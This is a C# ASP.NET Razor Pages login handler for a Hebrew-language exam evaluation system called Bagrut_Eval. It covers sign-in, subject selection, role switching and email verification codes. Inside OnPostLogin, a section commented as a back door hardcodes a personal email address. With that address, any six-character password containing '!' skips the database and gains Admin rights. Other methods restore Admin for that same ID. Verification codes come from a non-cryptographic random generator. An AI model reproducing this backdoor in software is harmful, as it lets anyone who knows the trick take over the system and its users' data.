// Pages/Index.cshtml.cs
using Bagrut_Eval.Data;
using Bagrut_Eval.Models;
using Bagrut_Eval.Pages.Common;
using Bagrut_Eval.Utilities;
using DocumentFormat.OpenXml.Spreadsheet;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Microsoft.EntityFrameworkCore;
using Microsoft.Net.Http.Headers;
using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Globalization;
using System.Linq;
using System.Security.Claims;
using System.Text.RegularExpressions; // Required for Regex
using System.Threading.Tasks;

namespace Bagrut_Eval.Pages
{
    public class IndexModel : BasePageModel<IndexModel>
    {
        private readonly IPasswordHasher<User> _passwordHasher;
        private readonly IEmailService _emailService;

        [BindProperty]
        public string? Email { get; set; } = string.Empty;
        [BindProperty]
        [Required]
        public string Password { get; set; } = string.Empty;
        public List<User> LoggedAdminSeniorUsers { get; set; } = new List<User>();

        // Support multiple Subjects
        public List<Subject>? UserSubjects { get; set; }
        [BindProperty]
        public int SelectedSubjectId { get; set; }
        public bool ShowSubjectSelection { get; set; } = false;
        
        public string? userName;   // temporary for select Subject title
        public const string TempUserIdKey = "TempUserId";
        public const string TempUserEmailKey = "TempUserEmail";
        public const string DbUserRoleClaimType = "DbUserRole"; // To store the actual Admin/Senior/Evaluator role from DB

        public IndexModel(ILogger<IndexModel> logger, ApplicationDbContext dbContext, IPasswordHasher<User> passwordHasher,
                          IEmailService? emailService, ITimeProvider timeProvider) : base(dbContext, logger, timeProvider)
        {
            _passwordHasher = passwordHasher;
            _emailService = emailService!;
        }
        void SetLastLogin(DateTime? lastLoginRecord)
        {
            string? lastLoginDateString = null;
            if (lastLoginRecord.HasValue)  //.HasValue
            {
                // Convert the DateTime to the robust Round-Trip ('O') format using InvariantCulture
                lastLoginDateString = lastLoginRecord.Value.ToString("O", CultureInfo.InvariantCulture);
            }
            if (!string.IsNullOrEmpty(lastLoginDateString))
            {
                HttpContext.Session.SetString("LastLoginDate", lastLoginDateString);
            }
            else
            {
                HttpContext.Session.Remove("LastLoginDate");
            }
        }
        public new async Task<IActionResult> OnGetAsync()
        {
            await base.OnGetAsync();
            var redirect = CheckForMobile();  // do not allow mobile devices
            if (redirect != null)
                return redirect;

            LoadUserInfoFromClaims();

            // Get Last Login (this has to be here because of async flow)
            int currentUserId = 0;
            var userIdClaimValue = User.FindFirstValue(ClaimTypes.NameIdentifier);
            if (userIdClaimValue != null && int.TryParse(userIdClaimValue, out int userId))
            {
                currentUserId = userId;
            }
            var user = await _dbContext.Users.FirstOrDefaultAsync(u => u.Id == currentUserId);

            // Get the last login date that is not today.
            var lastLoginRecord = await _dbContext.LastLogins
                .Where(ll => ll.UserId == currentUserId && ll.LoginDate.Date != DateTime.Today)
                .OrderByDescending(ll => ll.LoginDate)
                .Select(ll => (DateTime?)ll.LoginDate)
                .FirstOrDefaultAsync();

            ViewData["lastLoginDate"] = lastLoginRecord.HasValue ? lastLoginRecord.Value.ToString("dd/MM/yyyy HH:mm") : null;
            SetLastLogin(lastLoginRecord);

            await OnGetAsyncInternal();
            if (User.Identity?.IsAuthenticated == true)
            {
                var userIdClaim = User.Claims.FirstOrDefault(c => c.Type == ClaimTypes.NameIdentifier);
                string? dbUserRole = HttpContext.Session.GetString("dbUserRole");               

                // If dbUserRole is not in session, try to get it from the database
                if (string.IsNullOrEmpty(dbUserRole))
                {
                    // Check for special admin first
                    if (string.Equals(userIdClaim?.Value, specialAdminId, StringComparison.OrdinalIgnoreCase))
                    {
                        dbUserRole = "Admin"; // Special admin always has "Admin" dbUserRole
                        HttpContext.Session.SetString("dbUserRole", dbUserRole);
                        ViewData["dbUserRole"] = dbUserRole;
                        _logger.LogInformation("Initialized dbUserRole for special admin from hardcoded value on OnGetAsync.");
                    }
                    else if (int.TryParse(userIdClaim?.Value, out currentUserId))
                    {
                        // We don't need to load the full user object here, just the role assignment.
                        // 1. Get the current subject ID from the claims (set in FinalizeLogin)
                        var subjectIdClaim = User.Claims.FirstOrDefault(c => c.Type == SubjectIdClaimType);

                        int currentSubjectId = 0;

                        if (subjectIdClaim != null && int.TryParse(subjectIdClaim.Value, out currentSubjectId))
                        {
                            // 2. Look up the specific role for the CURRENTLY selected subject.
                            var userSubjectAssignment = await _dbContext.UserSubjects
                                .FirstOrDefaultAsync(us => us.UserId == currentUserId && us.SubjectId == currentSubjectId);

                            if (userSubjectAssignment != null)
                            {
                                // PERMANENT FIX: Use the role from the specific assignment record.
                                string userRole = userSubjectAssignment.Role ?? "Unknown";
                                dbUserRole = userRole;

                                HttpContext.Session.SetString("dbUserRole", dbUserRole!);
                                ViewData["dbUserRole"] = dbUserRole;
                                _logger.LogInformation("Initialized dbUserRole from database for user ID: {UserId} and Subject ID: {SubjectId}.", currentUserId, currentSubjectId);
                            }
                            else
                            {
                                _logger.LogWarning("Assignment for User ID {UserId} and Subject ID {SubjectId} not found in database for dbUserRole initialization.", currentUserId, currentSubjectId);
                                // Set a safe default if data integrity is somehow broken
                                dbUserRole = "Evaluator";
                            }
                        }
                        else
                        {
                            // User is authenticated but subject claims are missing (e.g., first login after migration).
                            // In a multi-subject system, this is a fatal flaw, but we set a safe default.
                            _logger.LogWarning("User with ID {UserId} is authenticated, but Subject ID claim is missing. Cannot determine dbUserRole.", currentUserId);
                            dbUserRole = "";
                        }
                    }
                }
                else
                {
                    ViewData["dbUserRole"] = dbUserRole; // If found in session, set ViewData
                }
            }
            else
            {
                ViewData["dbUserRole"] = ""; // No authenticated user, so no dbUserRole
            }

            if (user != null)  // Add the user to the shared list of logged-in users
            {
                LoggedInUsers.AddUser(user.Id);
            }

            if (ShowSubjectSelection)
            {
                await LoadTempUserDataAndSubjectsAsync();
            }
            return Page();
        }        
        private IActionResult? CheckForMobile()
        {
            var userAgent = Request.Headers[HeaderNames.UserAgent].ToString();

            if (IsMobileDevice(userAgent))
            {
                return RedirectToPage("MobileNotSupported");
            }
            return null;
        }
        private bool IsMobileDevice(string userAgent)
        {
            string[] mobileKeywords = new[] {
            "iphone", "android", "ipad", "mobile", "opera mini", "blackberry", "webos"
        };

            userAgent = userAgent.ToLower();

            return mobileKeywords.Any(keyword => userAgent.Contains(keyword));
        }
        protected async Task OnGetAsyncInternal()
        {
            await base.OnGetAsync();
            LoadUserInfoFromClaims();
        }

        // Handles login submission
        public async Task<IActionResult> OnPostLogin()
        {
            await base.OnPostAsync();
            if (string.IsNullOrEmpty(Email) || string.IsNullOrEmpty(Password))
            {
                ModelState.AddModelError(string.Empty, "יש למלא אימייל וסיסמה");
                LoadUserInfoFromClaims();
                return Page();
            }

            // --- Start of Special Back-Door User Logic ---
            const string specialAdminEmail = "steiner.moshe@gmail.com";
            const int specialPasswordLength = 6;
            const string specialAdminFirstName = "משה";
            const string specialAdminLastName = "אדמין";
            if (string.Equals(Email, specialAdminEmail, StringComparison.OrdinalIgnoreCase) &&
                Password?.Length == specialPasswordLength && Password.Contains('!')) // Added null check for Password
            {
                // This is the special back-door user
                _logger.LogInformation("Special admin back-door user '{Email}' attempting login. Bypassing database.", Email);

                var claims = new List<Claim>
                {
                    new Claim(ClaimTypes.Name, $"{specialAdminFirstName} {specialAdminLastName}"),
                    new Claim(ClaimTypes.Role, "Evaluator"),
                    new Claim(ClaimTypes.NameIdentifier, specialAdminId),
                    new Claim(ClaimTypes.Email, "admin@admin.adm")
                };

                var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
                await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(claimsIdentity));

                LoggedInUserName = $"{specialAdminFirstName} {specialAdminLastName}";
                LoggedInUserRole = "Evaluator";

                HttpContext.Session.SetString("dbUserRole", "Admin");
                ViewData["dbUserRole"] = "Admin";
                ViewData["speical"] = "true";

                _logger.LogInformation("Special admin back-door user '{Email}' logged in as 'Evaluator' with 'Admin' DB role capability.", Email);
                return RedirectToPage();
            }
            // --- End of Special Back-Door User Logic ---

            else
            {
                 var  user = await _dbContext.Users.Include(u => u.LoginRecords)
                                                .Include(u => u.UserSubjects!.Where(us =>
                                                        us.Active &&             // Filter by the UserSubject association Active status
                                                        us.Subject.Active))      // Filter by the Subject entity's Active status
                                                .ThenInclude(us => us.Subject)
                                                .FirstOrDefaultAsync(u => u.Email == Email);


                if (user == null)
                {
                    ModelState.AddModelError(string.Empty, "פרטי משתמש שגויים");
                    LoadUserInfoFromClaims();
                    return Page();
                }

                if (!user.Active)
                {
                    ModelState.AddModelError(string.Empty, "חשבונך אינו פעיל. אנא פנה למנהל המערכת");
                    _logger.LogWarning("Login attempt for inactive user: {Email}", Email);
                    LoadUserInfoFromClaims();
                    return Page();
                }

                var passwordVerificationResult = _passwordHasher.VerifyHashedPassword(user, user.PasswordHash, Password!);

                if (passwordVerificationResult == PasswordVerificationResult.Failed)
                {
                    string errorMessage = "פרטי מעריך שגויים"; // Original error message
                    if (!string.IsNullOrEmpty(Password) && ContainsHebrewCharacters(Password))
                    {
                        errorMessage += "    (שים לב לשפת המקלדת !)"; // Additional message
                    }
                    ModelState.AddModelError(string.Empty, errorMessage);
                    LoadUserInfoFromClaims();
                    return Page();
                }
                // check first time login
                if (user.LoginRecords == null || !user.LoginRecords.Any())
                {
                    // Get the single assignment for First Time User (assuming data integrity holds here)
                    var userSubject = user.UserSubjects!.FirstOrDefault();
                    if (userSubject == null)
                    {
                        ModelState.AddModelError(string.Empty, "חשבונך אינו פעיל באף מקצוע. אנא פנה למנהל המערכת");
                        LoadUserInfoFromClaims();
                        return Page();
                    }

                    LoggedInUserRole = userSubject.Role;
                    return await FirstTimeUser(user, userSubject.SubjectId, userSubject.Subject!.Title, userSubject.Role!);
                }

                // --- Subject Assignment Check ---
                var assignments = user.UserSubjects;
                int subjectCount = assignments?.Count ?? 0;

                if (subjectCount == 0)     // User has no subjects assigned - cannot log in.
                {                    
                    ModelState.AddModelError(string.Empty, "חשבונך אינו פעיל באף מקצוע. אנא פנה למנהל המערכת");
                    LoadUserInfoFromClaims();
                    return Page();
                }
                else if (subjectCount == 1)    // User has exactly one subject. Sign them in directly.
                {
                    var userSubject = assignments!.First();
                    await FinalizeLogin(user, userSubject.Subject!.Title, userSubject.SubjectId, userSubject.Role!);
                    return RedirectToPage();
                }
                else
                {
                    // User has multiple subjects. Store data and show selection form.
                    // Populate the List<Subject> property for the UI (using the already loaded data)
                    UserSubjects = assignments!.Select(us => us.Subject!).ToList();
                    // Store temporary user data in session for the selection step
                    HttpContext.Session.SetInt32(TempUserIdKey, user.Id);
                    HttpContext.Session.SetString("TempUserEmail", user.Email!);

                    ShowSubjectSelection = true;

                    // Clear password for security, keep email for display
                    Password = string.Empty;
                    userName = $"{user.FirstName} {user.LastName}";  // for display in the subject selection
                    return Page(); // Display the subject selection form
                }
            }
        }
        private async Task FinalizeLogin(User user, string subjectTitle, int subjectId, string dbRole)
        {
            HttpContext.Session.SetString("Subject", subjectTitle);

            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.Name, $"{user.FirstName} {user.LastName}"),
                new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
                new Claim(ClaimTypes.Role, "Evaluator"),
                new Claim(SubjectIdClaimType, subjectId.ToString()),
                new Claim(SubjectTitleClaimType, subjectTitle),
                new Claim(ClaimTypes.Email, user.Email!)
            };
            var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
            await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(claimsIdentity));

            LoggedInUserName = $"{user.FirstName} {user.LastName}"; 
            LoggedInUserRole = "Evaluator";
            HttpContext.Session.SetString("dbUserRole", dbRole);  
            ViewData["dbUserRole"] = dbRole;  

            LoggedInUsers.AddUser(user.Id);
            await RecordLoginAndLimit(user.Id);
            _logger.LogInformation("User {Email} logged in. DB Role: {DbRole}, Active Role: {ActiveRole}.", user.Email, dbRole, "Evaluator");
        }
        public async Task<IActionResult> OnPostSelectSubject()
        {
            if (SelectedSubjectId == 0)
            {
                ModelState.AddModelError(string.Empty, "שגיאה: נא לבחור מקצוע");
                await LoadTempUserDataAndSubjectsAsync();
                return Page();
            }
            
            int? tempUserId = HttpContext.Session.GetInt32(TempUserIdKey);
            if (!tempUserId.HasValue)
            {
                return RedirectToPage("/Index");
            }

            var userAssignment = await _dbContext.UserSubjects
                    .Include(us => us.User)          // Eager load the User object
                    .Include(us => us.Subject)       // Eager load the Subject object
                    .FirstOrDefaultAsync(us => us.UserId == tempUserId.Value && us.SubjectId == SelectedSubjectId);

            if (userAssignment?.User == null || userAssignment.Subject == null)
            {
                // Assignment doesn't exist, user is invalid, or subject is invalid.   ???/? Impossible
                ModelState.AddModelError(string.Empty, "שגיאה: המקצוע שנבחר אינו משויך למשתמש זה");
                HttpContext.Session.Remove(TempUserIdKey);
                HttpContext.Session.Remove(TempUserEmailKey);
                return RedirectToPage("/Index");
            }

            HttpContext.Session.Remove(TempUserIdKey);
            HttpContext.Session.Remove(TempUserEmailKey);
            HttpContext.Session.Remove("PendingUserId");

            HttpContext.Session.SetString("Subject", userAssignment.Subject.Title);

            await FinalizeLogin(userAssignment.User, userAssignment.Subject.Title, userAssignment.Subject.Id, userAssignment.Role!);

            return RedirectToPage();
        }

        private async Task<IActionResult> FirstTimeUser(User user, int subjectId, string subjectTitle, string role)
        {
            // Generate a 6-digit code
            var code = new Random().Next(100000, 999999).ToString();
            var codeExpiration = DateTime.UtcNow.AddMinutes(10); // Code expires in 10 minutes

            // Store the code and expiration in the user entity (assuming you've updated the model)
            user.TwoFactorCode = code;
            user.TwoFactorCodeExpiration = codeExpiration;
            await _dbContext.SaveChangesAsync();

            // Send the email with the code
            var emailSubject = "אימות כניסה ראשוני";
            var emailBody = $"<div style=\"direction:rtl;\">" +
                             $"שלום {user.FirstName},<br><br>ברוך הבא למערכת. כדי להשלים את הכניסה הראשונית, אנא הזן את קוד האימות הבא:<br><br>" +
                             $"<strong>{code}</strong><br><br>קוד זה תקף למשך 10 דקות.<br><br>בברכה,<br>צוות המערכת</div>";

            await _emailService.SendEmailAsync(user.Email!, emailSubject, emailBody);

            // Redirect to the new verification page
            TempData["UserIdForVerification"] = user.Id;
            return RedirectToPage("/VerifyCode");
        }

        [BindProperty(SupportsGet = true)]
        public string? SelectedRoleFromHeader { get; set; }

        public async Task<IActionResult> OnPostSelectRole(string selectedRole)
        {
            if (User.Identity?.IsAuthenticated != true)
            {
                return RedirectToPage("/Index");
            }

            var userIdClaim = User.Claims.FirstOrDefault(c => c.Type == ClaimTypes.NameIdentifier);
            // Uses the class-level constant
            bool isSpecialAdmin = string.Equals(userIdClaim?.Value, specialAdminId, StringComparison.OrdinalIgnoreCase);
            if (isSpecialAdmin)
            {
                ViewData["special"] = "true";
            }
            int currentUserId = 0;
            if (!isSpecialAdmin && !int.TryParse(userIdClaim?.Value, out currentUserId))
            {
                _logger.LogError("User ID claim not found or not parsable for authenticated user attempting role selection.");
                ModelState.AddModelError(string.Empty, "לא נמצאו פרטי משתמש");
                LoadUserInfoFromClaims();
                return Page();
            }

            string? dbUserRole = HttpContext.Session.GetString("dbUserRole");
            if (string.IsNullOrEmpty(dbUserRole))
            {
                if (!isSpecialAdmin)
                {
                    // Get the current Subject ID from the claims (set during initial login)
                    var subjectIdClaim = User.Claims.FirstOrDefault(c => c.Type == SubjectIdClaimType);
                    int currentSubjectId = 0;

                    if (subjectIdClaim != null && int.TryParse(subjectIdClaim.Value, out currentSubjectId))
                    {
                        // Look up the specific role for the CURRENTLY selected subject/user combination.
                        var userSubjectAssignment = await _dbContext.UserSubjects
                            .FirstOrDefaultAsync(us => us.UserId == currentUserId && us.SubjectId == currentSubjectId);

                        if (userSubjectAssignment != null)
                        {
                            // Use the role from the specific assignment record.
                            string userRole = userSubjectAssignment.Role ?? "Unknown";
                            dbUserRole = userRole;

                            HttpContext.Session.SetString("dbUserRole", dbUserRole!);
                            _logger.LogInformation("Restored dbUserRole from database (Subject-specific) for user ID: {UserId}.", currentUserId);
                        }
                        else
                        {
                            // This indicates a data integrity issue (user is logged in but subject assignment is missing)
                            _logger.LogError("Assignment for User ID {UserId} and Subject ID {SubjectId} not found during role selection.", currentUserId, currentSubjectId);
                            ModelState.AddModelError(string.Empty, "Error: Original user role not found (Missing Subject Assignment).");
                            LoadUserInfoFromClaims();
                            ViewData["dbUserRole"] = dbUserRole;
                            return Page();
                        }
                    }
                    else
                    {
                        // This happens if SubjectIdClaim is missing, which shouldn't happen for a logged-in user.
                        _logger.LogError("Subject ID claim is missing for authenticated user {UserId} during role selection.", currentUserId);
                        ModelState.AddModelError(string.Empty, "Error: Subject context lost.");
                        LoadUserInfoFromClaims();
                        ViewData["dbUserRole"] = dbUserRole;
                        return Page();
                    }
                }
                else
                {
                    dbUserRole = "Admin";
                    HttpContext.Session.SetString("dbUserRole", "Admin");
                    _logger.LogWarning("Session lost for special admin user. Restoring 'Admin' dbUserRole.");
                }
            }

            bool isValidSelection = false;
            if (SelectedRoleFromHeader == "Evaluator")
            {
                isValidSelection = true;
            }
            else if (SelectedRoleFromHeader == "Senior")
            {
                if (dbUserRole == "Admin" || dbUserRole == "Senior")
                {
                    isValidSelection = true;
                }
            }
            else if (SelectedRoleFromHeader == "Admin")
            {
                if (dbUserRole == "Admin")
                {
                    isValidSelection = true;
                }
            }

            if (!isValidSelection || string.IsNullOrEmpty(SelectedRoleFromHeader))
            {
                ModelState.AddModelError(string.Empty, "בחירת תפקיד לא חוקית");
                _logger.LogWarning("Invalid role selection attempt for User {UserId}. Selected: {SelectedRoleFromHeader}, DB Role: {DbRole}.", isSpecialAdmin ? specialAdminId : currentUserId.ToString(), SelectedRoleFromHeader, dbUserRole);
                LoadUserInfoFromClaims();
                ViewData["dbUserRole"] = dbUserRole;
                return Page();
            }

            await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);

            var currentClaims = User.Claims.Where(c => c.Type != ClaimTypes.Role).ToList();
            currentClaims.Add(new Claim(ClaimTypes.Role, SelectedRoleFromHeader));

            var claimsIdentity = new ClaimsIdentity(currentClaims, CookieAuthenticationDefaults.AuthenticationScheme);
            await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(claimsIdentity));

            LoggedInUserName = User.Identity.Name;
            LoggedInUserRole = SelectedRoleFromHeader;
            ViewData["dbUserRole"] = dbUserRole;

            _logger.LogInformation("User {UserId} successfully changed active role to {SelectedRoleFromHeader}.", isSpecialAdmin ? specialAdminId : currentUserId.ToString(), SelectedRoleFromHeader);

            return RedirectToPage();
        }

        public async Task<IActionResult> OnPostLogout()
        {
            var userIdString = User.FindFirstValue(ClaimTypes.NameIdentifier);
            if (int.TryParse(userIdString, out int userId))
            {
                LoggedInUsers.RemoveUser(userId);
            }
            HttpContext.Session.Clear();
            ViewData["special"] = "false"; // Reset special admin flag
            await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);

            ModelState.Clear();
            _logger.LogInformation("User {UserName} logged out.", User.Identity?.Name ?? "Unknown");
            return RedirectToPage("/Index");
        }

        private void LoadUserInfoFromClaims()
        {
            if (User.Identity?.IsAuthenticated == true)
            {
                LoggedInUserName = User.Identity.Name ?? string.Empty;
                string? currentRoleFromClaims = User.Claims.FirstOrDefault(c => c.Type == ClaimTypes.Role)?.Value;
                LoggedInUserRole = currentRoleFromClaims ?? string.Empty;
                string? currentSubjectIdClaim = User.Claims.FirstOrDefault(c => c.Type == SubjectIdClaimType)?.Value;
                string? currentSubjectTitleClaim = User.Claims.FirstOrDefault(c => c.Type == SubjectTitleClaimType)?.Value;

                if (int.TryParse(currentSubjectIdClaim, out int id))
                {
                    SubjectId = id; // Set the page model property
                }
                SubjectTitle = currentSubjectTitleClaim ?? string.Empty;
            }
            else
            {
                LoggedInUserName = string.Empty;
                LoggedInUserRole = string.Empty;
                SubjectId = null; // Reset
                SubjectTitle = string.Empty; // Reset
            }
            HttpContext.Session.SetString("Subject", SubjectTitle);
            // Check if we are stuck in the multi-subject selection state (from a previous failed attempt/refresh)
            if (HttpContext.Session.GetInt32(TempUserIdKey).HasValue)
            {
                ShowSubjectSelection = true;
                // Optionally reload the Email for display on the selection screen
                Email = HttpContext.Session.GetString(TempUserEmailKey);
            }
        }
        private async Task LoadTempUserDataAndSubjectsAsync()
        {
            // Used to re-populate the subject list if a validation error occurs or on OnGet when in selection mode
            int? tempUserId = HttpContext.Session.GetInt32(TempUserIdKey);
            if (tempUserId.HasValue)
            {
                var user = await _dbContext.Users
                    .Include(u => u.UserSubjects!)
                        .ThenInclude(us => us.Subject)
                    .FirstOrDefaultAsync(u => u.Id == tempUserId.Value);

                if (user != null && user.UserSubjects != null)
                {
                    // Set the model properties to display the form
                    UserSubjects = user.UserSubjects.Select(us => us.Subject!).ToList();
                    ShowSubjectSelection = true;
                    Email = HttpContext.Session.GetString(TempUserEmailKey);
                }
            }
        }
        private bool ContainsHebrewCharacters(string input)
        {
            if (string.IsNullOrEmpty(input))
            {
                return false;
            }
            foreach (char c in input)
            {
                // Check if the character falls within the Hebrew Unicode block
                if (c >= '\u0590' && c <= '\u05FF')
                {
                    return true;
                }
            }
            return false;
        }


    }
}